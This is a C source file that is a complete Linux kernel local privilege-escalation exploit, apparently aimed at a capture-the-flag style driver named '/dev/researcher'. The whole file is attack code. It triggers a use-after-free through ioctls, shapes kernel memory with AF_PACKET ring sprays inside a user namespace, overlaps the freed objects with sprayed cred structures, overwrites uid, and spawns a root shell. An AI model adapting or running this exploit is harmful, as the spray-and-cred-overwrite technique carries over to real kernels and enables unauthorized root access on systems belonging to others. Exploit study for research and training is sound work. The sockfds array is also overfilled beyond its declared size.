#define _GNU_SOURCE

#include <stdio.h>
#include <stdbool.h>
#include <stdarg.h>
#include <stdlib.h>

#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/socket.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sched.h>

#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <netinet/if_ether.h>
#include <net/if.h>


int dev;

#define PAGE_SIZE               4096ul
#define OBJ_SIZE                (PAGE_SIZE/2)
#define OBJ_MAX                 128
#define OBJS_PERPAGE            (PAGE_SIZE/OBJ_SIZE)
#define MAX_PAGES               (OBJ_MAX/OBJS_PERPAGE)

#define CREDJARSLAB_SIZE        PAGE_SIZE
#define CREDJAROBJ_SIZE         128
#define CREDJAROBJS_PERPAGE     (CREDJARSLAB_SIZE/CREDJAROBJ_SIZE)

#define SETUID_SPRAY            (MAX_PAGES*CREDJAROBJS_PERPAGE)*2

enum reseacher_cmd{
    cmd_alloc = 0x1337000,
    cmd_delete = 0x1337001,
    cmd_write = 0x1337002
};

struct researcher_req{
    unsigned idx;
    size_t size;
    void *buf;
};

/* Page spray helpers - https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-72568/poc.c */
bool write_file(const char* file, const char* what, ...) {
	char buf[1024];
	va_list args;
	va_start(args, what);
	vsnprintf(buf, sizeof(buf), what, args);
	va_end(args);
	buf[sizeof(buf) - 1] = 0;
	int len = strlen(buf);

	int fd = open(file, O_WRONLY | O_CLOEXEC);
	if (fd == -1)
		return false;
	if (write(fd, buf, len) != len) {
		close(fd);
		return false;
	}
	close(fd);
	return true;
}

void setup_sandbox(void) {
	int real_uid = getuid();
	int real_gid = getgid();

    puts("[+] Starting sandbox");

    if (unshare(CLONE_NEWUSER) != 0) {
		perror("[-] unshare(CLONE_NEWUSER)");
		exit(EXIT_FAILURE);
	}

    if (unshare(CLONE_NEWNET) != 0) {
		perror("[-] unshare(CLONE_NEWUSER)");
		exit(EXIT_FAILURE);
	}

	if (!write_file("/proc/self/setgroups", "deny")) {
		perror("[-] write_file(/proc/self/set_groups)");
		exit(EXIT_FAILURE);
	}
	if (!write_file("/proc/self/uid_map", "0 %d 1\n", real_uid)){
		perror("[-] write_file(/proc/self/uid_map)");
		exit(EXIT_FAILURE);
	}
	if (!write_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
		perror("[-] write_file(/proc/self/gid_map)");
		exit(EXIT_FAILURE);
	}
}

void packet_socket_rx_ring_init(int s, unsigned int block_size,
		unsigned int frame_size, unsigned int block_nr,
		unsigned int sizeof_priv, unsigned int timeout) {
	int v = TPACKET_V3;
	int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
	if (rv < 0) {
		perror("[-] setsockopt(PACKET_VERSION)");
		exit(EXIT_FAILURE);
	}

	struct tpacket_req3 req;
	memset(&req, 0, sizeof(req));
	req.tp_block_size = block_size;
	req.tp_frame_size = frame_size;
	req.tp_block_nr = block_nr;
	req.tp_frame_nr = (block_size * block_nr) / frame_size;
	req.tp_retire_blk_tov = timeout;
	req.tp_sizeof_priv = sizeof_priv;
	req.tp_feature_req_word = 0;

	rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
	if (rv < 0) {
		perror("[-] setsockopt(PACKET_RX_RING)");
		exit(EXIT_FAILURE);
	}
}

int packet_socket_setup(unsigned int block_size, unsigned int frame_size,
		unsigned int block_nr, unsigned int sizeof_priv, int timeout) {
	int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (s < 0) {
		perror("[-] socket(AF_PACKET)");
		exit(EXIT_FAILURE);
	}

	packet_socket_rx_ring_init(s, block_size, frame_size, block_nr,
		sizeof_priv, timeout);

	struct sockaddr_ll sa;
	memset(&sa, 0, sizeof(sa));
	sa.sll_family = PF_PACKET;
	sa.sll_protocol = htons(ETH_P_ALL);
	sa.sll_ifindex = if_nametoindex("lo");
	sa.sll_hatype = 0;
	sa.sll_pkttype = 0;
	sa.sll_halen = 0;

	int rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));
	if (rv < 0) {
		perror("[-] bind(AF_PACKET)");
		exit(EXIT_FAILURE);
	}

	return s;
}

void packet_socket_send(int s, char *buffer, int size) {
	struct sockaddr_ll sa;
	memset(&sa, 0, sizeof(sa));
	sa.sll_ifindex = if_nametoindex("lo");
	sa.sll_halen = ETH_ALEN;

	if (sendto(s, buffer, size, 0, (struct sockaddr *)&sa,
			sizeof(sa)) < 0) {
		perror("[-] sendto(SOCK_RAW)");
		exit(EXIT_FAILURE);
	}
}

void loopback_send(char *buffer, int size) {
	int s = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
	if (s == -1) {
		perror("[-] socket(SOCK_RAW)");
		exit(EXIT_FAILURE);
	}

	packet_socket_send(s, buffer, size);
}

int packet_sock_kmalloc() {
	int s = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
	if (s == -1) {
		perror("[-] socket(SOCK_DGRAM)");
		exit(EXIT_FAILURE);
	}
	return s;
}

void packet_sock_timer_schedule(int s, int timeout) {
	packet_socket_rx_ring_init(s, 0x1000, 0x1000, 1, 0, timeout);
}

void packet_sock_id_match_trigger(int s) {
	char buffer[16];
	packet_socket_send(s, &buffer[0], sizeof(buffer));
}

int pagealloc_pad(size_t size, int count) {
	return packet_socket_setup(size, 4096, count, 0, 100);
}

/* Setuid spray helpers */
int step1[2];
int step2[2];
pthread_mutex_t *lock;

void init_mutex(void){
	pthread_mutexattr_t attr;
    pthread_mutexattr_init(&attr);
    pthread_mutexattr_setpshared(&attr, PTHREAD_PROCESS_SHARED);

	lock = mmap(NULL, sizeof(pthread_mutex_t), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	pthread_mutex_init(lock, &attr);
}

void setuid_spray(void){
	char *argv[] = {"/bin/sh", NULL};
	
	// Allocate new cred
	read(step1[0], NULL, 1);
	setuid(1337);

	// Check if root
	read(step2[0], NULL, 1);

	if(getuid() == 0){
		pthread_mutex_lock(lock);
		setreuid(0, 0);
		puts("[+] Got root");
		execve("/bin/sh", (char * const*)&argv, NULL);
		pthread_mutex_lock(lock);
		sleep(13371337);
	}
	exit(0);
}

// Device helpers
int open_dev(void){
    return open("/dev/researcher", O_RDONLY);
}

long do_new(int idx, size_t size, void *buf){
    struct researcher_req req = {
        .idx = idx,
        .size = size,
        .buf = buf
    };
    return ioctl(dev, cmd_alloc, &req);
}

long do_delete(int idx){
    struct researcher_req req = {
        .idx = idx,
        .size = 0,
        .buf = NULL
    };
    return ioctl(dev, cmd_delete, &req);
}

long do_write(int idx, size_t size, void *buf){
    struct researcher_req req = {
        .idx = idx,
        .size = size,
        .buf = buf
    };
    return ioctl(dev, cmd_write, &req);
}

// Exploit
char data[OBJ_SIZE];
int main(void){
    int sockfds[MAX_PAGES];

    memset(data, '\0', OBJ_SIZE);
    dev = open_dev();
    init_mutex();

	// Create processes for setuid spray
    pipe(step1); pipe(step2);
    for (int _ = 0; _ < SETUID_SPRAY; _++){
        if(!fork()){
			setuid_spray();
		}
    }

	// Namespace to enable setsockopt
	setup_sandbox();

	// Consume existing buddy ord 0 pages
	puts("[+] Consuming buddy ord 0 pages");
	for (int i = 0; i < 768; i++){
		pagealloc_pad(PAGE_SIZE, 1);
	}

	// Create padding for vuln/victim objs spray
	puts("[+] Creating page padding");
	for (int i = 0; i < MAX_PAGES*2; i++){
		sockfds[i] =  pagealloc_pad(PAGE_SIZE, 1);
	}

    // Setup uaf slots
    for (int i = 0; i < MAX_PAGES*2; i+=2){
		close(sockfds[i]);
	}

    // Alloc uaf objects
    for (int i = 0; i < OBJ_MAX; i++){
        do_new(i, OBJ_SIZE, data);
    }

    // Trigger uaf
    for (int i = 0; i < OBJ_MAX; i++){
        do_delete(i);
    }

    // Overlap uaf objects with cred objects
	puts("[+] Allocating cred objects");
	for (int i = 0; i < SETUID_SPRAY; i++){
		write(step1[1], "\0", 1);
	}

	// Overwrite cred->uid
    data[0] = 3;
    puts("[+] Corrupting cred");
    for (int i = 1; i <= 5; i+=2){
        do_write(i, 6, data);
    }

	// Check if we are root
	for (int i = 0; i < SETUID_SPRAY; i++){
		write(step2[1], "\0", 1);
	}
	sleep(13371337);

}